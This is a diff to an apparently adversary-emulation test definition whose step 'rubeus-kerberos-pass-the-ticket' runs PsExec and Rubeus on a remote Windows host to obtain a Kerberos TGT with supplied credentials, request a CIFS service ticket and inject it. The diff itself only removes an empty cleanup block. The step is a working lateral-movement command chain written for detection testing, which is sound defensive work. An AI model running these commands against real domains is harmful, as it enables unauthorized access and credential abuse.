@@ -52,6 +52,3 @@ steps:
     - name: rubeus-kerberos-pass-the-ticket
       inline: "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula \\\\{{.Args.target}} -w c:\\ -c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgt /user:{{.Args.user_name}} /password:{{.Args.password}} /domain:{{.Args.domain}} /outfile:ticket.kirbi\nSet-Location \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nMove-Item -Force \"\\\\{{.Args.target}}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host \"Successfully retrieved TGT from '{{.Args.target}}', now requesting a TGS from local\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/{{.Args.target}} /ticket:ticket.kirbi /ptt\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\ticket.kirbi\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" purge      "
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
